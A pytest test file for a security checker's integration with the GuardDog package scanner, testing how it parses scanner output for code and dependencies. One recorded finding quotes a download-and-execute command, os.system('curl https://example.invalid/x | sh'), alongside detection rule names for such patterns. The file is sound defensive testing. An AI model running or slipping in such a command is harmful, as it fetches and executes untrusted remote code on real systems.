"""GuardDog, on the integration and on its dependencies: parsing its output, and
output recorded from the real tool."""

from pathlib import Path
from typing import Any

import pytest

from doorcheck.adapters import Audience, Parsed, load
from doorcheck.adapters.guarddog import GuardDog, GuardDogDependencies
from doorcheck.checks import Problem
from doorcheck.dependencies import Dependencies
from doorcheck.findings import Confidence, Location, Severity
from tests.adapters_support import (
    CLEAN,
    DEPENDENCIES,
    GAP_PROBLEMS,
    GAPS,
    PINS,
    UNSAFE,
    as_recorded,
    at,
    dump,
    only,
    recorded,
    summary,
)

pytestmark = pytest.mark.usefixtures("offline")


@pytest.mark.parametrize("name", ["guarddog", "guarddog-dependencies"])
def test_guarddog_is_registered_as_experimental(name: str) -> None:
    adapter = load().adapters[name]
    assert isinstance(adapter, (GuardDog, GuardDogDependencies))
    assert (adapter.version, adapter.audience, adapter.experimental) == (
        "3.2.0",
        Audience.USERS,
        True,
    )


def guarddog_output(results: dict[str, Any], errors: dict[str, str] | None = None) -> bytes:
    return dump({"results": results, "errors": errors or {}})


def test_guarddog_skips_empty_and_metadata_rules(tmp_path: Path) -> None:
    match = {"location": "pkg/a.py:12", "code": "code", "message": "m"}
    results = {"capability-x": {}, "typosquatting": "a metadata message", "threat-y": [match]}
    finding = only(GuardDog().parse(guarddog_output(results), at(tmp_path)))
    assert (finding.rule_id, finding.location) == ("guarddog/threat-y", Location("pkg/a.py", 12))
    assert (finding.severity, finding.confidence, finding.evidence) == (
        Severity.INFO,
        Confidence.LOW,
        "code",
    )
    assert (finding.tool, finding.message_key) == ("guarddog", "finding.tool_reported")


def test_guarddog_rule_names_become_rule_ids(tmp_path: Path) -> None:
    match = {"location": "a.py:1", "code": "", "message": "m"}
    finding = only(GuardDog().parse(guarddog_output({"bundled_binary": [match]}), at(tmp_path)))
    assert (finding.rule_id, finding.evidence) == ("guarddog/bundled-binary", None)


def test_guarddog_paths_given_absolute(tmp_path: Path) -> None:
    match = {"location": f"{tmp_path}/a.py:3", "code": "c", "message": "m"}
    finding = only(GuardDog().parse(guarddog_output({"threat-z": [match]}), at(tmp_path)))
    assert (finding.location.path, finding.params) == ("a.py", {"message": "m"})


def test_guarddog_paths_with_colons(tmp_path: Path) -> None:
    match = {"location": "odd:name.py:7", "code": "c", "message": "m"}
    finding = only(GuardDog().parse(guarddog_output({"threat-z": [match]}), at(tmp_path)))
    assert finding.location == Location("odd:name.py", 7)


def test_guarddog_checks_that_couldnt_run_are_problems(tmp_path: Path) -> None:
    output = guarddog_output({}, {"threat-b": "boom", "threat-a": "bang"})
    assert GuardDog().parse(output, at(tmp_path)) == Parsed(
        problems=(
            Problem("problem.tool_check_failed", None, {"check": "threat-a", "detail": "bang"}),
            Problem("problem.tool_check_failed", None, {"check": "threat-b", "detail": "boom"}),
        )
    )


def test_guarddog_command(tmp_path: Path) -> None:
    command = GuardDog("/opt/guarddog").command(at(tmp_path), tmp_path / "w")
    assert not isinstance(command, Parsed)
    assert command.argv == ("/opt/guarddog", "pypi", "scan", ".", "--output-format", "json")
    assert command.cwd == tmp_path
    assert GuardDog().version_command() == ("guarddog", "--version")


# --- dependencies ------------------------------------------------------------------


def test_guarddog_dependencies_writes_rebuilt_pins(tmp_path: Path) -> None:
    work = tmp_path / "w"
    work.mkdir()
    command = GuardDogDependencies().command(at(tmp_path, DEPENDENCIES), work)
    assert not isinstance(command, Parsed)
    assert (work / "requirements.txt").read_text() == "a==1\nFoo_Bar==1.9\n"
    assert command.cwd == work


def test_with_nothing_pinned_guarddogs_gaps_are_the_result(tmp_path: Path) -> None:
    command = GuardDogDependencies().command(at(tmp_path, Dependencies((), GAPS)), tmp_path)
    assert command == Parsed(problems=GAP_PROBLEMS)
    assert GuardDogDependencies().command(at(tmp_path), tmp_path) == Parsed()


def test_guarddog_dependencies_command(tmp_path: Path) -> None:
    command = GuardDogDependencies("/opt/guarddog").command(at(tmp_path, DEPENDENCIES), tmp_path)
    assert not isinstance(command, Parsed)
    assert command.argv == (
        "/opt/guarddog", "pypi", "verify", "requirements.txt", "--output-format", "json",
    )  # fmt: skip
    assert command.ok_exit_codes == {0}
    assert GuardDogDependencies().version_command() == ("guarddog", "--version")


def verify_item(
    dependency: str, results: dict[str, Any], errors: dict[str, str] | None = None
) -> dict[str, Any]:
    return {
        "dependency": dependency,
        "version": "1.0",
        "result": {"results": results, "errors": errors or {}},
    }


def test_metadata_rules_are_notices_and_empty_rules_are_skipped(tmp_path: Path) -> None:
    results = {
        "typosquatting": "close to 'pkgs'",
        "deceptive_author": None,
        "bundled_binary": "",
        "x": {},
    }
    items = [verify_item("a", results), verify_item("foo-bar", {})]
    parsed = GuardDogDependencies().parse(dump(items), at(tmp_path, Dependencies(PINS)))
    finding = only(parsed)
    assert (finding.rule_id, finding.severity, finding.confidence) == (
        "guarddog-dependencies/typosquatting",
        Severity.NOTICE,
        Confidence.LOW,
    )
    assert dict(finding.params) == {"package": "a", "version": "1.0", "message": "close to 'pkgs'"}
    assert finding.location == Location("manifest.json", 3)
    assert (finding.message_key, finding.tool) == ("finding.tool_reported", "guarddog-dependencies")


def test_code_rules_in_a_package_point_at_its_requirement(tmp_path: Path) -> None:
    match = {"location": "x/y.py:3", "code": "c", "message": "m"}
    items = [verify_item("FOO.bar", {"rule_a": [match]}), verify_item("a", {})]
    finding = only(GuardDogDependencies().parse(dump(items), at(tmp_path, Dependencies(PINS))))
    assert (finding.rule_id, finding.location, finding.evidence, finding.severity) == (
        "guarddog-dependencies/rule-a",
        Location("manifest.json", 4),
        "c",
        Severity.INFO,
    )
    assert dict(finding.params) == {
        "package": "FOO.bar",
        "version": "1.0",
        "file": "x/y.py:3",
        "message": "m",
    }


def test_a_package_that_wasnt_asked_for_points_at_the_top(tmp_path: Path) -> None:
    match = {"location": "x/y.py:3", "code": "c", "message": "m"}
    parsed = GuardDogDependencies().parse(
        dump([verify_item("other", {"r": [match]})]), at(tmp_path)
    )
    assert only(parsed).location == Location("manifest.json", 1)


def test_every_package_guarddog_left_out_is_a_problem(tmp_path: Path) -> None:
    parsed = GuardDogDependencies().parse(dump([]), at(tmp_path, DEPENDENCIES))
    assert parsed.findings == ()
    assert parsed.problems == (
        *GAP_PROBLEMS,
        Problem(
            "problem.dependency_not_checked", Location("manifest.json", 3), {"requirement": "a==1"}
        ),
        Problem(
            "problem.dependency_not_checked",
            Location("manifest.json", 4),
            {"requirement": "Foo_Bar==1.9"},
        ),
    )


def test_a_package_reported_twice_is_still_checked(tmp_path: Path) -> None:
    items = [verify_item("a", {}), verify_item("a", {}), verify_item("foo_bar", {})]
    assert GuardDogDependencies().parse(dump(items), at(tmp_path, Dependencies(PINS))) == Parsed()


def test_dependency_checks_that_couldnt_run(tmp_path: Path) -> None:
    items = [verify_item("a", {}, {"typosquatting": "timed out"}), verify_item("foo-bar", {})]
    parsed = GuardDogDependencies().parse(dump(items), at(tmp_path, Dependencies(PINS)))
    assert parsed == Parsed(
        problems=(
            Problem(
                "problem.tool_check_failed",
                Location("manifest.json", 3),
                {"package": "a", "version": "1.0", "check": "typosquatting", "detail": "timed out"},
            ),
        )
    )


def test_a_package_guarddog_couldnt_download(tmp_path: Path) -> None:
    error = "Version 0.7.16 for package yeelight doesn't exist."
    item = {
        "dependency": "a",
        "version": "1",
        "result": {"issues": 0, "errors": {"download-package": error}},
    }
    deps = Dependencies(PINS[:1])
    (problem,) = GuardDogDependencies().parse(dump([item]), at(tmp_path, deps)).problems
    assert (problem.key, problem.location, problem.params["check"]) == (
        "problem.tool_check_failed",
        Location("manifest.json", 3),
        "download-package",
    )


# --- recorded output ---------------------------------------------------------------


def test_guarddog_findings_are_information() -> None:
    parsed = GuardDog().parse(recorded("guarddog", "unsafe"), as_recorded(UNSAFE))
    info, low = Severity.INFO, Confidence.LOW
    assert summary(parsed.findings) == [
        ("guarddog/capability-network-lolbas", info, low, "hidden.py", 5, None),
        ("guarddog/capability-process-spawn", info, low, "__init__.py", 23, None),
        ("guarddog/threat-process-download-exec", info, low, "hidden.py", 5, None),
        ("guarddog/threat-runtime-obfuscation-base64exec", info, low, "__init__.py", 23, None),
    ]
    download = parsed.findings[2]
    assert download.evidence == 'os.system("curl https://example.invalid/x | sh")'
    message = "Detects download-and-execute patterns: fetching a remote file then executing it"
    assert download.params == {"message": message}
    assert parsed.problems == ()


def test_guarddog_on_clean_code() -> None:
    assert GuardDog().parse(recorded("guarddog", "clean"), as_recorded(CLEAN)) == Parsed()


def test_guarddog_scans_the_packages_the_manifest_installs() -> None:
    parsed = GuardDogDependencies().parse(
        recorded("guarddog-dependencies", "unsafe"), as_recorded(UNSAFE)
    )
    by_package: dict[str, list[str]] = {}
    for f in parsed.findings:
        by_package.setdefault(f.params["package"], []).append(f.rule_id)
    assert by_package == {
        "icmplib": ["guarddog-dependencies/capability-network-outbound"],
        "requests": [
            "guarddog-dependencies/capability-filesystem-delete",
            "guarddog-dependencies/capability-filesystem-read",
            "guarddog-dependencies/capability-process-spawn",
        ],
    }
    lines = {f.params["package"]: f.location.line for f in parsed.findings}
    assert lines == {"requests": 6, "icmplib": 7}
    icmplib = next(f for f in parsed.findings if f.params["package"] == "icmplib")
    assert (icmplib.params["version"], icmplib.params["file"]) == (
        "3.0.4",
        "icmplib/sockets.py:260",
    )
    assert icmplib.severity is Severity.INFO


def test_guarddog_dependencies_reports_every_gap() -> None:
    parsed = GuardDogDependencies().parse(
        recorded("guarddog-dependencies", "unsafe"), as_recorded(UNSAFE)
    )
    gaps = [
        (p.key, p.location.line if p.location else None, dict(p.params)) for p in parsed.problems
    ]
    outside = "problem.requirement_outside_pypi"
    failed = "problem.tool_check_failed"
    assert [(key, line) for key, line, _ in gaps] == [
        (outside, 8),
        (outside, 9),
        (failed, 7),
        (failed, 7),
        (failed, 6),
        (failed, 6),
        ("problem.dependency_not_checked", 10),
    ]
    assert gaps[2][2]["check"] == "potentially_compromised_email_domain"
    assert gaps[-1][2] == {"requirement": "doorcheck-fixture-not-on-pypi==1.0"}


def test_guarddog_dependencies_had_nothing_to_look_at_in_the_clean_fixture() -> None:
    assert not (UNSAFE.parent.parent / "tools" / "guarddog-dependencies" / "clean.json").exists()


def test_a_package_with_neither_results_nor_errors_is_not_a_clean_check(tmp_path: Path) -> None:
    item = {"dependency": "a", "version": "1", "result": {"errors": {}}}
    with pytest.raises(ValueError, match=r"^guarddog reported neither results nor errors$"):
        GuardDogDependencies().parse(dump([item]), at(tmp_path, Dependencies(PINS[:1])))
